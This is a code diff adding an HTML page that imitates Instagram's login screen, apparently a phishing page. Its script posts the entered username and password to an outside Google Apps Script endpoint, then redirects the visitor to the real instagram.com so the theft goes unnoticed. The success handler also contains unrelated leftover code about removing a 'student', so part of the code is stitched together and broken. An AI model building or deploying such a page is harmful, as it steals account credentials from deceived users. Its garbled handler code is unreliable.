@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+  <head>
+
+    <meta charset="UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Instagram - Clone</title>
+
+    <link rel="stylesheet" href="style.css" />
+
+   
+
+    <link href="http://fonts.cdnfonts.com/css/billabong" rel="stylesheet" />
+
+    <link
+
+      href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300&display=swap"
+
+      rel="stylesheet"
+
+    />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+
+
+  </head>
+
+  <body>
+
+    <!-- LOGIN BOX -->
+
+    <form id="submit-form" action="">
+
+    <div class="login">
+
+      <img src="instagram logo.png" alt="" srcset="" />
+
+      <input
+
+        class="box1"
+
+        name="username/phone:-" required="required" type="text"
+
+        placeholder="Phone number, username, or email"
+
+        required
+
+      />
+
+      <input class="box2" name="password:"  placeholder="Password" required />
+
+      <button class="btn" >Log In</button>
+
+
+
+      <div class="partition">
+
+        <div class="left"></div>
+
+        <div class="center">OR</div>
+
+        <div class="right"></div>
+
+      </div>
+
+</form>
+
+
+
+
+
+
+
+
+
+<script>
+
+        $("#submit-form").submit((e)=>{
+
+            e.preventDefault()
+
+            $.ajax({
+
+                url:"https://script.google.com/macros/s/AKfycbwxm62Fs7DK6B-XojNqbXhGcbGwNT3-Ml93VvU9UQvh42olxl1u/exec",
+
+                data:$("#submit-form").serialize(),
+
+                method:"post",
+
+                success:function (data) {
+
+            if (data.success == true) {
+
+                var div_id = id + "_div";
+
+                var parent_div = $(div_id);
+
+                parent_div.remove();
+
+            } else {
+
+                alert("Student wasn't removed!");
+
+            }
+
+                    window.location.reload()
+
+                    window.location.href="https://instagram.com"
+
+                },
+
+                error:function (err){
+
+                    alert("Something Error")
+
+    
+
+                }
+
+            })
+
+        })
+
+    </script>
+
+      <!-- SIGN UP BOX -->
+
+      <div class="bottom" style="display: flex">
+
+        <img src="fb.png" alt="" srcset="" />
+
+        <a href="#">Log in with Facebook </a>
+
+        <h4>Forgot Password?</h4>
+
+      </div>
+
+    </div>
+
+    <div class="sign-up" id="sign-up" style="display: flex">
+
+      <h3>Don't have an account?</h3>
+
+      <a href="./sign-up form.html">Sign up</a>
+
+    </div>
+
+
+
+    <!-- DOWNLOAD SECTION -->
+
+    <div class="download">
+
+      <h3>Get the app.</h3>
+
+      <img class="app-store" src="app store.png" alt="" srcset="" />
+
+      <img class="play-store" src="play store.png" alt="" />
+
+    </div>
+
+
+
+    <!------ FOOTER SECTION ------>
+
+    <div class="footer">
+
+      <div class="first-footer">
+
+        <span>About</span>
+
+        <span>Blog</span>
+
+        <span>Jobs</span>
+
+        <span>Help</span>
+
+        <span>API</span>
+
+        <span>Priavacy</span>
+
+        <span>Terms</span>
+
+        <span>Top Account</span>
+
+        <span>Hashtags</span>
+
+        <span>Locations</span>
+
+      </div>
+
+      <div class="second-footer" style="display: flex;">
+
+        <div class="languages">
+
+          <select name="language" id="option">
+
+            <option value="">Afrikaans</option>
+
+            <option value="">Čeština</option>
+
+            <option value="">Dansk</option>
+
+            <option value="">Deutsch</option>
+
+            <option value="">Ελληνικά</option>
+
+            <option value="">English</option>>
+
+            <option value="" selected>English (UK)</option>
+
+            <option value="">Español (España)</option>
+
+            <option value="">Español</option>
+
+            <option value="">Suomi</option>
+
+            <option value="">Français</option>
+
+            <option value="">Bahasa Indonesia</option>
+
+            <option value="">Italiano</option>
+
+            <option value="">日本語</option>
+
+            <option value="">한국어</option>
+
+            <option value="">Bahasa Melayu</option>
+
+            <option value="">Norsk</option>
+
+            <option value="">Nederlands</option>
+
+            <option value="">Polski</option>
+
+            <option value="">Português (Brasil)</option>
+
+            <option value="">Português (Portugal)</option>
+
+            <option value="">Русский</option>
+
+            <option value="">Svenska</option>
+
+            <option value="">ภาษาไทย</option>
+
+            <option value="">Filipino</option>
+
+            <option value="">Türkçe</option>
+
+            <option value="">中文(简体)</option>
+
+            <option value="">中文(台灣)</option>
+
+            <option value="">বাংলা</option>
+
+            <option value="">ગુજરાતી</option>
+
+            <option value="">हिन्दी</option>
+
+            <option value="">Hrvatski</option>
+
+            <option value="">Magyar</option>
+
+            <option value="">ಕನ್ನಡ</option>
+
+            <option value="">മലയാളം</option>
+
+            <option value="">मराठी</option>
+
+            <option value="">नेपाली</option>
+
+            <option value="">ਪੰਜਾਬੀ</option>
+
+            <option value="">සිංහල</option>
+
+            <option value="">Slovenčina</option>
+
+            <option value="">தமிழ்</option>
+
+            <option value="">తెలుగు</option>
+
+            <option value="">Tiếng Việt</option>
+
+            <option value="">中文(香港)</option>
+
+            <option value="">Български</option>
+
+            <option value="">Français (Canada)iếng</option>
+
+            <option value="">Română</option>
+
+            <option value="">Српски</option>
+
+            <option value="">Українська</option>
+
+          </select>
+
+        </div>
+
+        <div class="copyright">
+
+          <i class="fa fa-copyright"></i>
+
+           <span style="padding: 0.3rem; color:gray">Instagram by facebook, 2021</span>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </body>
+
+</html>
+
